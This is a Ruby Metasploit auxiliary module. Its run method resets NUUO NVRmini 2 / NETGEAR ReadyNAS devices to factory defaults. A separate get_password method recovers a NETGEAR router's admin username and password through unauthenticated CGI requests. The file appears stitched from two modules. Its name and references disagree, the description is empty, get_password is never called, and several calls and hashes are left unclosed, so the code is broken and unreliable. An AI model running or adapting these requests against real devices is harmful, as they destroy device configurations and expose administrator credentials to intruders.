##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'NUUO NVRmini 2 / NETGEAR ReadyNAS Surveillance Default Configuration Load and Administrator Password Reset',
      'Description' => %q{
      },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt'],
          ['URL', 'http://seclists.org/fulldisclosure/2016/Dec/72']
        ],
      'DisclosureDate'  => 'Dec 20 2016',

    register_options(
      [
        Opt::RPORT(80)
      ], self.class)
  end
  
  def get_password (q1, q2)
    res = send_request_cgi({
      'uri'     => '/BRS_netgear_success.html',
      'method'  => 'GET'
    })
    if res && res.body =~ /var sn="([\w]*)";/
      serial = $1
    else
      puts "[-]Failed to obtain serial number, bailing out..."
      exit(1)
    end
    
    # 1: send serial number
    res = send_request_cgi({
        'uri'     => '/apply_noauth.cgi?/unauth.cgi',
        'method'  => 'POST',
        'Content-Type' => 'application/x-www-form-urlencoded',
        'vars_post' => 
        {
          'submit_flag' => 'match_sn',
          'serial_num'  => serial,
          'continue'    => '+Continue+'
      })

    # 2: send answer to secret questions
    res = send_request_cgi({
        'uri'     => '/apply_noauth.cgi?/securityquestions.cgi',
        'method'  => 'POST',
        'Content-Type' => 'application/x-www-form-urlencoded',
        'vars_post' => 
        {
          'submit_flag' => 'security_question',
          'answer1'     => q1,
          'answer2'     => q2,
          'continue'    => '+Continue+'
      })    
    
    # 3: PROFIT!!!
    res = send_request_cgi({
      'uri'     => '/passwordrecovered.cgi',
      'method'  => 'GET'
    })
    
    if res && res.body =~ /Admin Password: (.*)<\/TD>/
      password = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to obtain password")
    end
    
    if res && res.body =~ /Admin Username: (.*)<\/TD>/
      username = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to obtain username")
    end
    
    print_good("#{peer} - Success! Got admin username #{username} and password #{password}")    
    return [username, password]
  end  


  def run
    res = send_request_cgi({
        'uri' => normalize_uri(datastore['TARGETURI'], "cgi-bin", "cgi_system"),
        'vars_get' => { 'cmd' => "loaddefconfig" }
    })

    if res && res.code == 401
      res = send_request_cgi({
              'method' => 'POST',
              'uri' => normalize_uri(datastore['TARGETURI'], "login.php"),
              'vars_post' => {
                'user' => datastore['USERNAME'],
                'pass' => datastore['PASSWORD'],
                'submit' => "Login"
              }
      })
      if res && (res.code == 200 || res.code == 302)
        cookie = res.get_cookies
      else
        fail_with(Failure::Unknown, "#{peer} - A valid username / password is needed to reset the device.")
      end
      res = send_request_cgi({
          'uri' => normalize_uri(datastore['TARGETURI'], "cgi-bin", "cgi_system"),
          'cookie' => cookie,
          'vars_get' => { 'cmd' => "loaddefconfig" }
      })
    end

    if res && res.code == 200 && res.body.to_s =~ /load default configuration ok/
      print_good("#{peer} - Device has been reset to the default configuration.")
    else
      print_error("#{peer} - Failed to reset device.")
    end
  end
end
